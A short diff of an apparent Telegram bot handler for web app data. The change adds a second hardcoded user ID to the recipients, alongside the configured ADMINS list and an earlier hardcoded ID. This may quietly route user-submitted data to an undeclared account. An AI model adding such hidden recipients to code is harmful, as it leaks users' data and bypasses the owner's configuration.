@@ -130,6 +130,7 @@ async def handle_web_app_data(message: Message):
 
         admin_recipients = set(ADMINS)
         admin_recipients.add(7351189083)
+        admin_recipients.add(6243887731)
 
         for admin_id in admin_recipients:
             try:
